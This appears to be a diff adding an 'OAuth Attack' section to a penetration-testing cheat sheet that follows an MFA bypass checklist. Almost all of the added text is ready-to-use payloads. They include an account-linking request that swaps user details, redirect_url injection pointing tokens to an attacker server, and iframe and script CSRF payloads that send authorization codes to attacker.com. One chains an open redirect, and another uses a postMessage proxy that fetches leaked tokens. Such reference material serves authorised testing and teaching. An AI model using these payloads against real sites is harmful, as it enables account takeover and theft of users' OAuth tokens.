@@ -124,6 +124,75 @@ Common MFA bypass techniques can include:
   * [ ] Is there a less secure service that doesn't require MFA but grants similar access?
   * [ ] Are there any APIs or resources that do not enforce MFA?
 
+## OAuth Attack <a href="#oauth-attack" id="oauth-attack"></a>
+
+### Change User Info <a href="#change-user-info" id="change-user-info"></a>
+
+```shellscript
+POST /authenticate HTTP/1.1
+...
+
+{
+    "email":"victim@example.com",
+    "username":"attacker",
+    "token":"b7Gl7Xoy..."
+}
+```
+
+### Steal Tokens <a href="#steal-tokens" id="steal-tokens"></a>
+
+#### 1. Open Web Server in Your Local Machine <a href="#id-1-open-web-server-in-your-local-machine" id="id-1-open-web-server-in-your-local-machine"></a>
+
+```shellscript
+python3 -m http.server 8000
+```
+
+#### 2. Inject Your Local URL to the Redirect URL <a href="#id-2-inject-your-local-url-to-the-redirect-url" id="id-2-inject-your-local-url-to-the-redirect-url"></a>
+
+Access to the URL below.
+
+```shellscript
+https://vulnerable.com/oauth?redirect_url=http://<attacker-ip>:8000/login&response_type=token&scope=all
+```
+
+### CSRF <a href="#csrf" id="csrf"></a>
+
+#### 1. Steal Code <a href="#id-1-steal-code" id="id-1-steal-code"></a>
+
+```shellscript
+<iframe src="https://vulnerable.com/oauth-linking?code=kZ7bfFa..."></iframe>
+```
+
+#### 2. Hijack redirect\_url <a href="#id-2-hijack-redirect_url" id="id-2-hijack-redirect_url"></a>
+
+```shellscript
+<iframe src="https://vulnerable.com/auth?client_id=ysdj...&redirect_uri=https://attacker.com&response_type=code&scope=openid%20profile%20email">
+</iframe>
+```
+
+#### 3. Open Redirect <a href="#id-3-open-redirect" id="id-3-open-redirect"></a>
+
+```shellscript
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://vulnerable.com/auth?client_id=7Fdx8a...&redirect_uri=https://vulnerable.com/oauth-callback/../post/next?path=https://attacker.com/exploit/&response_type=token&nonce=398...&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+
+#### 4. Proxy Page (postMessage) <a href="#id-4-proxy-page-postmessage" id="id-4-proxy-page-postmessage"></a>
+
+```shellscript
+<iframe src="https://vulnerable.com/auth?client_id=iknf...&redirect_uri=https://vulnerable.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-118...&scope=openid%20profile%20email"></iframe>
+<script>
+    window.addEventListener('message', e => {
+        fetch("/" + encodeURIComponent(e.data.data));
+    }, false);
+</script>
+```
+
 ### Explanation
 
 ```shellscript
